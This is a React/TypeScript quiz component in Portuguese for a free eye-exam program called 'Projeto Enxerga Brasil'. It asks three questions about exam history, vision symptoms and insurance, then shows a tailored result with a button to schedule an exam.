import React, { useState, useCallback } from "react";
import useUtmNavigator from "../hooks/useUtmNavigator";

type Answers = {
  1: string | null;
  2: string | null;
  3: string | null;
};

const TOTAL_STEPS = 3;

const labels: Record<number, Record<string, string>> = {
  1: {
    nao: "Não fez exame há mais de 2 anos",
    "nao-lembro": "Não lembra quando foi o último",
    sim: "Fez exame nos últimos 2 anos",
  },
  2: {
    "dor-cabeca": "Dor de cabeça frequente",
    "visao-embacada": "Visão embaçada ou dupla",
    "olhos-cansados": "Olhos cansados ou ardendo",
    nenhum: "Sem sintomas aparentes",
  },
  3: {
    "sem-plano": "Não tem plano de saúde",
    "com-plano": "Tem plano de saúde privado",
  },
};

const Quiz: React.FC = () => {
  const navigate = useUtmNavigator();
  const [currentStep, setCurrentStep] = useState(1);
  const [answers, setAnswers] = useState<Answers>({ 1: null, 2: null, 3: null });
  const [showResult, setShowResult] = useState(false);

  const pct = Math.round((currentStep / TOTAL_STEPS) * 100);

  const selectAnswer = useCallback((step: number, value: string) => {
    setAnswers((prev) => ({ ...prev, [step]: value }));
  }, []);

  const nextStep = useCallback((next: number) => {
    setCurrentStep(next);
    window.scrollTo({ top: 0, behavior: "smooth" });
  }, []);

  const handleShowResult = useCallback(() => {
    setShowResult(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
  }, []);

  const refazer = useCallback(() => {
    setAnswers({ 1: null, 2: null, 3: null });
    setShowResult(false);
    setCurrentStep(1);
  }, []);

  // Resultado logic
  const getResult = () => {
    const r1 = answers[1];
    const r2 = answers[2];
    const r3 = answers[3];

    const semExame = r1 === "nao" || r1 === "nao-lembro";
    const temSintoma = r2 !== "nenhum" && r2 !== null;
    const semPlano = r3 === "sem-plano";

    let badgeClass: string, badgeTexto: string, titulo: string, mensagem: string, ctaLabel: string;

    if (semExame && temSintoma) {
      badgeClass = "bg-[#fff3cd] text-[#7d5700]";
      badgeTexto = "Atenção necessária";
      titulo = "Você precisa de um exame com urgência";
      mensagem =
        "Você está há mais de 2 anos sem exame e apresenta sintomas que podem indicar um problema de visão. O Projeto Enxerga Brasil é gratuito e você pode agendar agora mesmo.";
      ctaLabel = "Agendar meu exame agora";
    } else if (semExame && !temSintoma) {
      badgeClass = "bg-[#dbe8fb] text-[#1351B4]";
      badgeTexto = "Recomendado";
      titulo = "Está na hora de checar sua visão";
      mensagem =
        "Mesmo sem sintomas aparentes, a recomendação é realizar o exame oftalmológico a cada 2 anos. Muitos problemas são detectados antes de causar sintomas. Agende seu exame gratuito.";
      ctaLabel = "Quero agendar meu exame";
    } else if (!semExame && temSintoma) {
      badgeClass = "bg-[#dbe8fb] text-[#1351B4]";
      badgeTexto = "Vale uma nova avaliação";
      titulo = "Seus sintomas merecem atenção";
      mensagem =
        "Mesmo tendo feito um exame recente, os sintomas que você relatou podem indicar mudanças na sua visão. Vale agendar uma nova avaliação — é gratuito e não precisa de encaminhamento.";
      ctaLabel = "Agendar nova avaliação";
    } else {
      badgeClass = "bg-[#d4edda] text-[#155724]";
      badgeTexto = "Em dia";
      titulo = "Sua visão parece estar em dia";
      mensagem =
        "Você está em dia com o exame e sem sintomas. Mas lembre-se: o Projeto Enxerga Brasil também atende familiares e dependentes que possam precisar. Indique o programa para quem você ama.";
      ctaLabel = "Agendar para um familiar";
    }

    const planoObs = semPlano
      ? "O programa é ideal para você — 100% gratuito pelo SUS."
      : "Você pode indicar o programa para familiares sem plano de saúde.";

    return { badgeClass, badgeTexto, titulo, mensagem, ctaLabel, planoObs };
  };

  // Option button component
  const OptionButton = ({
    value,
    label,
    sublabel,
    step,
  }: {
    value: string;
    label: string;
    sublabel: string;
    step: number;
  }) => {
    const selected = answers[step as keyof Answers] === value;
    return (
      <button
        onClick={() => selectAnswer(step, value)}
        className={`flex items-center justify-between gap-3.5 border-2 rounded-[7px] py-3.5 px-[18px] cursor-pointer transition-all text-[15px] font-semibold text-left w-full ${
          selected
            ? "border-[#1351B4] bg-[#e8f0fe]"
            : "border-[#dde3ef] bg-white hover:border-[#1351B4] hover:bg-[#f0f5ff]"
        }`}
        style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
      >
        <div className="flex-1">
          <span className="text-[#071d41]">{label}</span>
          <small className="block text-xs text-[#5a6275] font-normal mt-0.5">{sublabel}</small>
        </div>
        <div
          className={`w-5 h-5 rounded-full border-2 flex-shrink-0 relative transition-all ${
            selected ? "border-[#1351B4] bg-[#1351B4]" : "border-[#dde3ef]"
          }`}
        >
          {selected && (
            <span className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[7px] h-[7px] bg-white rounded-full" />
          )}
        </div>
      </button>
    );
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#f4f6fb]">
      {/* Header */}
      <div className="bg-white border-b border-[#dde3ef] py-4 px-6">
        <h1 className="text-[17px] font-bold text-[#071d41]">Projeto Enxerga Brasil</h1>
        <p className="text-[13px] text-[#5a6275] mt-0.5">
          Descubra se você precisa de um exame de vista gratuito
        </p>
      </div>

      {/* Quiz area */}
      <div className="flex-1 flex items-center justify-center py-8 px-4">
        <div className="bg-white rounded-[10px] border border-[#dde3ef] shadow-[0_4px_24px_rgba(0,0,0,0.07)] w-full max-w-[580px] overflow-hidden">
          {/* Progress bar */}
          {!showResult && (
            <div className="pt-[22px] px-7">
              <div className="flex justify-between items-center mb-2.5 text-[13px]">
                <span className="text-[#5a6275] font-semibold">
                  Etapa {currentStep} de {TOTAL_STEPS}
                </span>
                <span className="text-[#1351B4] font-bold">{pct}%</span>
              </div>
              <div className="h-[5px] bg-[#f4f6fb] rounded-full overflow-hidden">
                <div
                  className="h-full bg-[#1351B4] rounded-full transition-all duration-400"
                  style={{ width: `${pct}%` }}
                />
              </div>
            </div>
          )}

          {/* Step 1 */}
          {!showResult && currentStep === 1 && (
            <div className="p-7 pt-7 animate-[fadeUp_0.3s_ease_both]">
              <div className="text-[11px] font-bold uppercase tracking-[1.2px] text-[#1351B4] mb-2">
                Etapa 1 · Histórico
              </div>
              <h2 className="text-[21px] font-bold text-[#071d41] leading-[1.3] mb-2">
                Você já fez um exame de vista nos últimos 2 anos?
              </h2>
              <p className="text-sm text-[#5a6275] mb-6 leading-relaxed">
                A recomendação médica é realizar o exame oftalmológico pelo menos uma vez a cada 2 anos.
              </p>

              <div className="flex flex-col gap-2.5">
                <OptionButton step={1} value="nao" label="Não" sublabel="Faz mais de 2 anos ou nunca fiz" />
                <OptionButton step={1} value="nao-lembro" label="Não lembro" sublabel="Não tenho certeza quando foi o último" />
                <OptionButton step={1} value="sim" label="Sim" sublabel="Fiz exame nos últimos 2 anos" />
              </div>

              <button
                onClick={() => nextStep(2)}
                disabled={!answers[1]}
                className={`mt-[22px] w-full rounded-[5px] py-[13px] text-[15px] font-bold text-white transition-colors ${
                  answers[1]
                    ? "bg-[#1351B4] hover:bg-[#0d3f8f] cursor-pointer opacity-100"
                    : "bg-[#1351B4] opacity-35 pointer-events-none"
                }`}
                style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
              >
                Próxima etapa
              </button>
            </div>
          )}

          {/* Step 2 */}
          {!showResult && currentStep === 2 && (
            <div className="p-7 pt-7 animate-[fadeUp_0.3s_ease_both]">
              <div className="text-[11px] font-bold uppercase tracking-[1.2px] text-[#1351B4] mb-2">
                Etapa 2 · Sintomas
              </div>
              <h2 className="text-[21px] font-bold text-[#071d41] leading-[1.3] mb-2">
                Você sente algum desses sintomas com frequência?
              </h2>
              <p className="text-sm text-[#5a6275] mb-6 leading-relaxed">
                Muitos problemas de visão passam despercebidos. Verifique se você se identifica com algum desses sinais.
              </p>

              <div className="flex flex-col gap-2.5">
                <OptionButton step={2} value="dor-cabeca" label="Dor de cabeça frequente" sublabel="Especialmente ao ler ou usar telas" />
                <OptionButton step={2} value="visao-embacada" label="Visão embaçada ou dupla" sublabel="Dificuldade de foco de perto ou de longe" />
                <OptionButton step={2} value="olhos-cansados" label="Olhos cansados ou ardendo" sublabel="Sensação de peso ou ardência nos olhos" />
                <OptionButton step={2} value="nenhum" label="Nenhum desses" sublabel="Não percebo sintomas no momento" />
              </div>

              <button
                onClick={() => nextStep(3)}
                disabled={!answers[2]}
                className={`mt-[22px] w-full rounded-[5px] py-[13px] text-[15px] font-bold text-white transition-colors ${
                  answers[2]
                    ? "bg-[#1351B4] hover:bg-[#0d3f8f] cursor-pointer opacity-100"
                    : "bg-[#1351B4] opacity-35 pointer-events-none"
                }`}
                style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
              >
                Próxima etapa
              </button>
            </div>
          )}

          {/* Step 3 */}
          {!showResult && currentStep === 3 && (
            <div className="p-7 pt-7 animate-[fadeUp_0.3s_ease_both]">
              <div className="text-[11px] font-bold uppercase tracking-[1.2px] text-[#1351B4] mb-2">
                Etapa 3 · Cobertura
              </div>
              <h2 className="text-[21px] font-bold text-[#071d41] leading-[1.3] mb-2">
                Você possui plano de saúde privado?
              </h2>
              <p className="text-sm text-[#5a6275] mb-6 leading-relaxed">
                O Projeto Enxerga Brasil atende <strong>todos os brasileiros</strong> — com ou sem plano de saúde. Mas a sua resposta nos ajuda a dar a orientação certa.
              </p>

              <div className="flex flex-col gap-2.5">
                <OptionButton step={3} value="sem-plano" label="Não tenho plano de saúde" sublabel="Dependo do SUS para atendimento médico" />
                <OptionButton step={3} value="com-plano" label="Tenho plano de saúde" sublabel="Possuo cobertura privada de saúde" />
              </div>

              <button
                onClick={handleShowResult}
                disabled={!answers[3]}
                className={`mt-[22px] w-full rounded-[5px] py-[13px] text-[15px] font-bold text-white transition-colors ${
                  answers[3]
                    ? "bg-[#1351B4] hover:bg-[#0d3f8f] cursor-pointer opacity-100"
                    : "bg-[#1351B4] opacity-35 pointer-events-none"
                }`}
                style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
              >
                Ver meu resultado
              </button>
            </div>
          )}

          {/* Result */}
          {showResult && (() => {
            const { badgeClass, badgeTexto, titulo, mensagem, ctaLabel, planoObs } = getResult();
            return (
              <div className="py-9 px-7 text-center animate-[fadeUp_0.35s_ease_both]">
                <span
                  className={`inline-block text-[11px] font-bold uppercase tracking-[1.2px] py-[5px] px-3.5 rounded-[3px] mb-[18px] ${badgeClass}`}
                >
                  {badgeTexto}
                </span>

                <h2 className="text-[22px] font-bold text-[#071d41] mb-3 leading-[1.3]">{titulo}</h2>

                <p className="text-[15px] text-[#5a6275] leading-[1.7] max-w-[440px] mx-auto mb-6">
                  {mensagem}
                </p>

                {/* Resumo */}
                <div className="bg-[#f4f6fb] rounded-[7px] py-3.5 px-[18px] mx-auto mb-5 max-w-[420px] text-left">
                  <div className="text-[13px] text-[#5a6275] py-1.5 border-b border-[#dde3ef]">
                    <strong className="text-[#071d41]">Histórico:</strong> {answers[1] ? labels[1][answers[1]] : "—"}
                  </div>
                  <div className="text-[13px] text-[#5a6275] py-1.5 border-b border-[#dde3ef]">
                    <strong className="text-[#071d41]">Sintomas:</strong> {answers[2] ? labels[2][answers[2]] : "—"}
                  </div>
                  <div className="text-[13px] text-[#5a6275] py-1.5">
                    <strong className="text-[#071d41]">Cobertura:</strong> {answers[3] ? labels[3][answers[3]] : "—"}
                  </div>
                </div>

                <p className="text-[13px] text-[#888] mb-[22px]">{planoObs}</p>

                <button
                  onClick={() => navigate("/clinica")}
                  className="inline-block bg-[#168821] hover:bg-[#0d5e19] text-white rounded-[5px] py-[13px] px-8 text-[15px] font-bold transition-colors mb-3 cursor-pointer"
                  style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
                >
                  {ctaLabel}
                </button>

                <span className="block text-[12px] text-[#aaa] mt-1.5">
                  Gratuito · Sem encaminhamento · Leva menos de 5 minutos
                </span>

                <div>
                  <button
                    onClick={refazer}
                    className="mt-4 bg-transparent border border-[#dde3ef] rounded-[5px] py-[9px] px-5 text-[13px] text-[#5a6275] cursor-pointer transition-colors hover:border-[#1351B4] hover:text-[#1351B4] inline-block"
                    style={{ fontFamily: "'Rawline','Raleway',sans-serif" }}
                  >
                    Refazer o quiz
                  </button>
                </div>
              </div>
            );
          })()}
        </div>
      </div>

      {/* Footer */}
      <div className="bg-[#071d41] py-3.5 px-5 text-center text-[12px] text-white/40">
        Projeto Enxerga Brasil · Ministério da Saúde · Governo Federal &nbsp;·&nbsp; 0800 000 0000
      </div>

      <style>{`
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(12px); }
          to   { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </div>
  );
};

export default Quiz;